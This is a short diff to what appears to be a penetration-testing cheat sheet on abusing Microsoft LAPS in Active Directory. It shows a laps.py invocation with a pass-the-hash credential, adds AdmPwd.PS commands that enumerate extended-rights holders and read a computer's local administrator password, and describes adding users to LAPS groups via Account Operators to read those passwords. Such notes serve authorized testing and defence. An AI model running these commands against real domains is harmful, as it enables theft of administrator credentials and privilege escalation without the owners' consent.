@@ -80,6 +80,14 @@
 
  - python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local
 
+#### 8) AdmPwd.PS
+
+ - Find-AdmPwdExtendedRights -identity *
+
+ - Find-AdmPwdExtendedRights -identity 'OU' | select-object ExtendedRightHolders
+
+ - get-admpwdpassword -computername COMPUTER_NAME | Select password
+
 # GRANT LAPS ACCESS
 
 ### The members of the group "Account Operator" can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password
